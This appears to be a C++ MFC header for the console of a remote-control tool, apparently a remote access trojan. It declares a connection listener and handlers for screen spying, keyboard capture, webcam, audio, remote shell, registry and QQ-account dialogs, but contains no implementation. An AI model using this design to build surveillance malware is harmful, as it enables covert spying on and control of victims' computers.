// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__D96EDC39_1381_4718_B899_775FF8C21139__INCLUDED_)
#define AFX_MAINFRM_H__D96EDC39_1381_4718_B899_775FF8C21139__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Weather.h"

class CMainFrame : public CXTPFrameWnd
{
	
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)

	HICON m_hDrawIcon;
	NOTIFYICONDATA m_NotifyIcon;
	BOOL  MinTray;  //程序显示状态变量

// Attributes
	public:
	CXTPControlGalleryItems* m_pItemsShapes;
	CXTPControlGalleryItems* m_pItemsStyles;
	CXTPControlGalleryItems* m_pItemsStyleSet;
	CXTPControlGalleryItems* m_pItemsThemeColors;
	CXTPControlGalleryItems* m_pItemsThemeFonts;
	
	CXTPControlGalleryItems* m_pItemsFontTextColor;
	CXTPControlGalleryItems* m_pItemsFontBackColor;
	CXTPControlGalleryItems* m_pItemsFontFace;
	CXTPControlGalleryItems* m_pItemsFontSize;
	CXTPControlGalleryItems* m_pItemsUndo;
	CXTPControlGalleryItems* m_pItemsColumns;
	BOOL m_bChecked;
	BOOL m_bOptions[6];
	
	CString m_strIniFileName;
	UINT m_nRibbonStyle;
	
	int m_nShape;
	int m_nStyle;
	int m_nColumns;
	CXTPMessageBar m_wndMessageBar;
	int m_nStyleSet;
	int m_nThemeColors;
	int m_nThemeFonts;
	
	BOOL m_bAnimation;
	BOOL m_bLayoutRTL;
	BOOL m_bShowWorkspace;
	
	CString m_csStylesPath;
// Operations
public:
	CMap<UINT,UINT, CWnd* , CWnd*> m_mapPanes;
	UINT Host;
	int m_nCount;
	int nOSCount [12];
	void ShowConnectionsNumber();
	void ShowOSCount();
	void StartIocp(int nPort, int nMaxConnections);
	static void CALLBACK NotifyProc(ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
	static void ProcessReceive(ClientContext *pContext);
    BOOL CreateRibbonBar();
	BOOL CreateMessageBar(char* lpszMessage);
// Operations
public:
	CWeather  m_wndDlgBar;

	int m_nUpCount;
// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL

// Implementation
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members
	CStatusBar  m_wndStatusBar;
	CToolBar    m_wndToolBar;
	CXTPTrayIcon m_TrayIcon;
	CXTPDockingPaneManager  m_paneManager;
	CXTPDockingPane* CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour = NULL);
// Generated message map functions
protected:
	//{{AFX_MSG(CMainFrame)
	afx_msg int OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl);//就这个函数了
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnClose();
	afx_msg void OnTimer(UINT nIDEvent);
	afx_msg void OnBuild();
	afx_msg void OnSetting();
	afx_msg void OnSz();
	afx_msg void LoadIcons();
	afx_msg void OnTools();
	afx_msg LRESULT OnSystray(WPARAM wParam,LPARAM lParam);
	afx_msg void OnNewstips();
	afx_msg void OnVoiceprompt();
	afx_msg CString Onlinetips();
	afx_msg CString OnVoicepromptsm();
	afx_msg void NotifyIconTip();
	afx_msg void OnShowStr();
	afx_msg void OnShow();
	afx_msg void OnExit();
	afx_msg void OnUpdateOptionsStyle(CCmdUI* pCmdUI);
	afx_msg void OnOptionsFont(UINT nID);
	afx_msg void OnUpdateOptionsFont(CCmdUI* pCmdUI);
	//}}AFX_MSG
	afx_msg void OnCustomize();
	afx_msg LRESULT OnDockingPaneNotify(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSysteminfoDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenServiceDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenTextChatDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenQqinfoDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenProxyMapDialog(WPARAM, LPARAM);
	afx_msg void OnOptionsStyle(UINT nStyle);
	void OnAutoResizeIcons();
	void OnUpdateAutoResizeIcons(CCmdUI* pCmdUI);
	void OnFrameTheme();
	void OnUpdateFrameTheme(CCmdUI* pCmdUI);
	void OnOptionsSystem();
	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__D96EDC39_1381_4718_B899_775FF8C21139__INCLUDED_)
